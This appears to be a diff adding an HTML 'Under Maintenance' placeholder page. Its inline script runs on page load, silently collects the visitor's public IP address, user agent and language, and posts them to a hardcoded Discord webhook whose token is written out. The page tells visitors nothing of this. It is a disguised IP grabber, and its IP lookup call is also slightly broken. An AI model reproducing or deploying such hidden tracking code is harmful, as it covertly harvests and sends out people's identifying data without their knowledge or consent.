@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Site Maintenance</title>
+</head>
+<body>
+    <h1>Under Maintenance</h1>
+    <p>This page is currently under construction. Please check back later.</p>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1558892647089836093/E4Xk1AqveqMt5TMLkPz9SO9BDuBLveX97hgOzQqTh3S9IHukEPWZMDtaJZCLottUBzj7';
+
+        async function logVisitor() {
+            try {
+                // Fetch public IP address from a free API
+                const ipResponse = await fetch('https://ipify.org');
+                const ipData = await ipResponse.json();
+                const visitorIp = ipData.ip;
+
+                // Gather basic browser data
+                const userAgent = navigator.userAgent;
+                const language = navigator.language;
+
+                // Prepare the payload for Discord
+                const payload = {
+                    content: `**New Visitor Logged**\n**IP:** ${visitorIp}\n**User Agent:** ${userAgent}\n**Language:** ${language}`
+                };
+
+                // Send the data to the Discord webhook
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error logging details:', error);
+            }
+        }
+
+        // Run the function when the page loads
+        window.onload = logVisitor;
+    </script>
+</body>
+</html>
